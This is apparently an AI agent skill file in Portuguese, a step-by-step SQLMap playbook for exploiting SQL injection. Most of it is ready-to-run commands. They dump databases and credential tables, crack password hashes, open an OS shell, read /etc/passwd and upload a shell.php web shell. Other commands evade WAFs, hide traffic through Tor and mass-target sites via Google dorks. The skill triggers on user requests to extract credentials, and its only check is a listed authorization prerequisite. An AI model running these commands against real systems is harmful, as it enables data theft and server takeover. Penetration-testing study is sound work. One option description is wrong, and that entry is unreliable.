---
name: SQLMap Database Penetration Testing
description: Esta habilidade deve ser usada quando o usuário pedir para "automatizar testes de SQL injection," "enumerar estrutura de banco de dados," "extrair credenciais de banco de dados usando sqlmap," "fazer dump de tabelas e colunas de um banco de dados vulnerável," ou "realizar testes automatizados de penetração em banco de dados." Fornece orientação abrangente para usar SQLMap e detectar e explorar vulnerabilidades de SQL injection.
metadata:
  author: zebbern
  version: "1.1"
---

# SQLMap Database Penetration Testing

## Propósito

Fornecer metodologias sistemáticas para detecção e exploração automatizadas de SQL injection usando SQLMap. Esta habilidade abrange enumeração de banco de dados, descoberta de tabelas e colunas, extração de dados, múltiplos métodos de especificação de alvo e técnicas avançadas de exploração para MySQL, PostgreSQL, MSSQL, Oracle e outros sistemas de gerenciamento de banco de dados.

## Inputs / Pré-requisitos

- **URL de Destino**: URL da aplicação web com parâmetro injetável (ex: `?id=1`)
- **Instalação do SQLMap**: Pré-instalado no Kali Linux ou baixado do GitHub
- **Ponto de Injeção Verificado**: Parâmetro de URL confirmado ou suspeito de ser SQL injetável
- **Arquivo de Requisição (Opcional)**: Requisição HTTP capturada do Burp Suite para injeção baseada em POST
- **Autorização**: Permissão escrita para atividades de testes de penetração

## Outputs / Entregas

- **Enumeração de Banco de Dados**: Lista de todos os bancos de dados no servidor de destino
- **Estrutura de Tabelas**: Nomes completos de tabelas dentro do banco de dados alvo
- **Mapeamento de Colunas**: Nomes de colunas e tipos de dados para cada tabela
- **Dados Extraídos**: Registros copiados incluindo nomes de usuário, senhas e dados sensíveis
- **Valores Hash**: Hashes de senha para crack offline
- **Relatório de Vulnerabilidade**: Confirmação do tipo de SQL injection e severidade

## Fluxo de Trabalho Principal

### 1. Identificar Vulnerabilidade de SQL Injection

#### Verificação Manual
```bash
# Adicionar aspas simples para quebrar a query
http://target.com/page.php?id=1'

# Se uma mensagem de erro aparecer, provavelmente é SQL injetável
# Exemplo de erro: "You have an error in your SQL syntax"
```

#### Scan Inicial com SQLMap
```bash
# Detecção básica de vulnerabilidade
sqlmap -u "http://target.com/page.php?id=1" --batch

# Com verbosidade para saída detalhada
sqlmap -u "http://target.com/page.php?id=1" --batch -v 3
```

### 2. Enumerar Bancos de Dados

#### Listar Todos os Bancos de Dados
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

**Opções-chave:**
- `-u`: URL de destino com parâmetro injetável
- `--dbs`: Enumerar nomes de bancos de dados
- `--batch`: Usar respostas padrão (modo não-interativo)

### 3. Enumerar Tabelas

#### Listar Tabelas em Banco de Dados Específico
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch
```

**Opções-chave:**
- `-D`: Especificar nome do banco de dados de destino
- `--tables`: Enumerar nomes de tabelas

### 4. Enumerar Colunas

#### Listar Colunas em Tabela Específica
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns --batch
```

**Opções-chave:**
- `-T`: Especificar nome da tabela de destino
- `--columns`: Enumerar nomes de colunas

### 5. Extrair Dados

#### Fazer Dump de Dados de Tabela Específica
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump --batch
```

#### Fazer Dump de Colunas Específicas
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump --batch
```

#### Fazer Dump de Banco de Dados Inteiro
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --dump-all --batch
```

**Opções-chave:**
- `--dump`: Extrair todos os dados da tabela especificada
- `--dump-all`: Extrair todos os dados de todas as tabelas
- `-C`: Especificar nomes de colunas a extrair

### 6. Opções Avançadas de Alvo

#### Alvo a partir de Arquivo de Requisição HTTP
```bash
# Salvar requisição do Burp Suite em arquivo, então:
sqlmap -r /path/to/request.txt --dbs --batch
```

#### Alvo a partir de Arquivo de Log
```bash
# Alimentar arquivo de log com múltiplas requisições
sqlmap -l /path/to/logfile --dbs --batch
```

#### Alvo de Múltiplas URLs (Arquivo em Lote)
```bash
# Criar arquivo com URLs, uma por linha:
# http://target1.com/page.php?id=1
# http://target2.com/page.php?id=2
sqlmap -m /path/to/bulkfile.txt --dbs --batch
```

#### Alvo via Google Dorks (Use com Cuidado)
```bash
# Encontrar e testar automaticamente sites vulneráveis (APENAS ALVOS LEGAIS)
sqlmap -g "inurl:?id= site:yourdomain.com" --batch
```

## Comandos de Referência Rápida

### Progressão de Enumeração de Banco de Dados

| Etapa | Comando |
|-------|---------|
| Listar Bancos de Dados | `sqlmap -u "URL" --dbs --batch` |
| Listar Tabelas | `sqlmap -u "URL" -D dbname --tables --batch` |
| Listar Colunas | `sqlmap -u "URL" -D dbname -T tablename --columns --batch` |
| Fazer Dump de Dados | `sqlmap -u "URL" -D dbname -T tablename --dump --batch` |
| Fazer Dump de Tudo | `sqlmap -u "URL" -D dbname --dump-all --batch` |

### Sistemas de Gerenciamento de Banco de Dados Suportados

| DBMS | Nível de Suporte |
|------|---------------|
| MySQL | Suporte Completo |
| PostgreSQL | Suporte Completo |
| Microsoft SQL Server | Suporte Completo |
| Oracle | Suporte Completo |
| Microsoft Access | Suporte Completo |
| IBM DB2 | Suporte Completo |
| SQLite | Suporte Completo |
| Firebird | Suporte Completo |
| Sybase | Suporte Completo |
| SAP MaxDB | Suporte Completo |
| HSQLDB | Suporte Completo |
| Informix | Suporte Completo |

### Técnicas de SQL Injection

| Técnica | Descrição | Flag |
|-----------|-------------|------|
| Boolean-based blind | Infere dados de respostas verdadeiro/falso | `--technique=B` |
| Time-based blind | Usa atrasos de tempo para inferir dados | `--technique=T` |
| Error-based | Extrai dados de mensagens de erro | `--technique=E` |
| UNION query-based | Usa UNION para anexar resultados | `--technique=U` |
| Stacked queries | Executa múltiplas instruções | `--technique=S` |
| Out-of-band | Usa DNS ou HTTP para exfiltração | `--technique=Q` |

### Opções Essenciais

| Opção | Descrição |
|--------|-------------|
| `-u` | URL de destino |
| `-r` | Carregar requisição HTTP do arquivo |
| `-l` | Analisar alvos do log Burp/WebScarab |
| `-m` | Arquivo em lote com múltiplos alvos |
| `-g` | Google dork (use responsavelmente) |
| `--dbs` | Enumerar bancos de dados |
| `--tables` | Enumerar tabelas |
| `--columns` | Enumerar colunas |
| `--dump` | Fazer dump de dados da tabela |
| `--dump-all` | Fazer dump de todos os dados do banco de dados |
| `-D` | Especificar banco de dados |
| `-T` | Especificar tabela |
| `-C` | Especificar colunas |
| `--batch` | Modo não-interativo |
| `--random-agent` | Usar User-Agent aleatório |
| `--level` | Nível de testes (1-5) |
| `--risk` | Risco dos testes (1-3) |

## Restrições e Limitações

### Limites Operacionais
- Requer parâmetro injetável válido na URL de destino
- Conectividade de rede com servidor de banco de dados de destino é necessária
- Dumps de banco de dados grandes podem levar tempo significativo
- Alguns sistemas WAF/IPS podem bloquear tráfego do SQLMap
- Ataques baseados em tempo significativamente mais lentos que baseados em erro

### Considerações de Desempenho
- Use `--threads` para acelerar enumeração (padrão: 1)
- Limitar dumps com `--start` e `--stop` para tabelas grandes
- Use `--technique` para especificar método de injeção mais rápido se conhecido

### Requisitos Legais
- Apenas testar sistemas com autorização escrita explícita
- Ataques por Google dork contra sites desconhecidos são ilegais
- Documentar todas as atividades e descobertas de testes
- Respeitar limites de escopo definidos nas regras de engajamento

### Risco de Detecção
- SQLMap gera entradas de log significativas
- Use `--random-agent` para variar o header User-Agent
- Considere `--delay` para evitar ativar limites de taxa
- Fazer proxy através de Tor com `--tor` para anonimato (apenas testes autorizados)

## Exemplos

### Exemplo 1: Enumeração Completa de Banco de Dados
```bash
# Etapa 1: Descobrir bancos de dados
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
# Resultado: banco de dados acuart encontrado

# Etapa 2: Listar tabelas
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
# Resultado: users, products, carts, etc.

# Etapa 3: Listar colunas
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
# Resultado: username, password, email colunas

# Etapa 4: Fazer dump de credenciais de usuário
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
```

### Exemplo 2: Injeção de Requisição POST
```bash
# Salvar requisição do Burp em arquivo (login.txt):
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# 
# username=admin&password=test

# Executar SQLMap com arquivo de requisição
sqlmap -r /root/Desktop/login.txt -p username --dbs --batch
```

### Exemplo 3: Scan de Alvos em Lote
```bash
# Criar bulkfile.txt:
echo "http://192.168.1.10/sqli/Less-1/?id=1" > bulkfile.txt
echo "http://192.168.1.10/sqli/Less-2/?id=1" >> bulkfile.txt

# Scannear todos os alvos
sqlmap -m bulkfile.txt --dbs --batch
```

### Exemplo 4: Testes Agressivos
```bash
# Nível e risco altos para testes mais completos
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --level=5 --risk=3

# Especificar todas as técnicas
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --technique=BEUSTQ
```

### Exemplo 5: Extrair Credenciais Específicas
```bash
# Alvo colunas específicas
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp \
  -T admin_users \
  -C admin_name,admin_pass,admin_email \
  --dump --batch

# Fazer crack automaticamente de hashes de senha
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp \
  -T users \
  --dump --batch \
  --passwords
```

### Exemplo 6: Acesso a Shell do SO (Avançado)
```bash
# Obter shell interativo do SO (requer privilégios DBA)
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch

# Executar comando específico do SO
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami" --batch

# Ler arquivo do servidor
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch

# Upload de arquivo para servidor
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php" --batch
```

## Solução de Problemas

### Problema: "Parameter does not seem injectable"
**Causa**: SQLMap não consegue encontrar ponto de injeção
**Solução**:
```bash
# Aumentar nível de teste e risco
sqlmap -u "URL" --dbs --batch --level=5 --risk=3

# Especificar parâmetro explicitamente
sqlmap -u "URL" -p "id" --dbs --batch

# Tentar diferentes técnicas de injeção
sqlmap -u "URL" --dbs --batch --technique=BT

# Adicionar prefixo/sufixo para bypass de filtro
sqlmap -u "URL" --dbs --batch --prefix="'" --suffix="-- -"
```

### Problema: Alvo Atrás de WAF/Firewall
**Causa**: Web Application Firewall bloqueando requisições
**Solução**:
```bash
# Usar scripts tamper
sqlmap -u "URL" --dbs --batch --tamper=space2comment

# Listar scripts tamper disponíveis
sqlmap --list-tampers

# Combinações de tamper comuns
sqlmap -u "URL" --dbs --batch --tamper=space2comment,between,randomcase

# Adicionar delay entre requisições
sqlmap -u "URL" --dbs --batch --delay=2

# Usar User-Agent aleatório
sqlmap -u "URL" --dbs --batch --random-agent
```

### Problema: Connection Timeout
**Causa**: Problemas de rede ou alvo lento
**Solução**:
```bash
# Aumentar timeout
sqlmap -u "URL" --dbs --batch --timeout=60

# Reduzir threads
sqlmap -u "URL" --dbs --batch --threads=1

# Adicionar tentativas
sqlmap -u "URL" --dbs --batch --retries=5
```

### Problema: Ataques Baseados em Tempo Muito Lentos
**Causa**: Delay de tempo padrão muito conservador
**Solução**:
```bash
# Reduzir delay de tempo (arriscado, pode causar falsos negativos)
sqlmap -u "URL" --dbs --batch --time-sec=3

# Usar boolean-based em vez disso, se possível
sqlmap -u "URL" --dbs --batch --technique=B
```

### Problema: Não Conseguir Fazer Dump de Tabelas Grandes
**Causa**: Tabela tem muitos registros
**Solução**:
```bash
# Limitar número de registros
sqlmap -u "URL" -D db -T table --dump --batch --start=1 --stop=100

# Fazer dump de colunas específicas apenas
sqlmap -u "URL" -D db -T table -C username,password --dump --batch

# Excluir colunas específicas
sqlmap -u "URL" -D db -T table --dump --batch --exclude-sysdbs
```

### Problema: Sessão Cai Durante Scan Longo
**Causa**: Timeout de sessão ou reset de conexão
**Solução**:
```bash
# Salvar e retomar sessão
sqlmap -u "URL" --dbs --batch --output-dir=/root/sqlmap_session

# Retomar de sessão salva
sqlmap -u "URL" --dbs --batch --resume

# Usar conexão HTTP persistente
sqlmap -u "URL" --dbs --batch --keep-alive
```